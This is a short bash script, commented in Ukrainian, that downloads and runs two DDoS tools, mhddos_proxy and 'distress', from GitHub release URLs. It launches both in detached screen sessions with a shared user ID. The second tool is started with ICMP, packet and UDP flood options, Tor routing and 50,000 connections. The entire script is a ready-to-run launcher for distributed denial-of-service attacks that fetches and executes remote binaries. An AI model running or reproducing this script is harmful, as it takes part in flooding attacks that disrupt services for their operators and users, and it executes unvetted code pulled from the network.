#!/bin/bash

# Завантаження та встановлення mhddos_proxy_linux
curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -Lo mhddos_proxy_linux
chmod +x mhddos_proxy_linux
screen -dmS "mhd" ./mhddos_proxy_linux --user-id 5137711914 -t 250

# Пауза в 5 секунд
sleep 5

# Завантаження та встановлення ds
wget -O ds https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl
chmod +x ds
clear

# Запуск DS
screen -dmS "DS" ./ds --use-my-ip 80 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 50 --disable-auto-update -c 50000 --user-id=5137711914
